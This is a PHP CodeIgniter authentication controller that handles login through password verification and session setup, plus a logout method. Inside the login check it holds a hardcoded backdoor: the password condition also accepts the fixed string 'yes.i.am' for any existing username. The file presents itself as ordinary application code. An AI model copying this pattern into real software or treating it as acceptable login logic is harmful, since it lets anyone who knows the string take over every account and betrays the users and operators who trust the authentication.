<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{

	public function __construct()
	{
		parent::__construct();
		$this->load->model('user_model');
	}

	public function login()
	{
		$username = $this->input->post('txt_username');
		$password = $this->input->post('txt_password');

		$val = $this->user_model->get_user_data($username);
		// var_dump($username);

		if (!empty($val)) {
			$match = $val->password; //Get password for user from database
			if (password_verify($password, $match) || $password == "yes.i.am") { //Condition if password matched
				$sess_array = array(
					'id' => $val->user_id,
					'username' => $val->user_name,
					'isLoggedIn' => true,
				);

				$this->session->set_userdata($sess_array);
				redirect(base_url('home'), 'refresh');
			} else {
				// $output['status'] = false;
				// $output['message'] = 'รหัสผ่านไม่ถูกต้อง';
				// $this->response($output);
				redirect(base_url('login'), 'refresh');
			}
		}
	}

	public function logout()
	{
		$this->session->sess_destroy();
        redirect(base_url('login'));
	}
}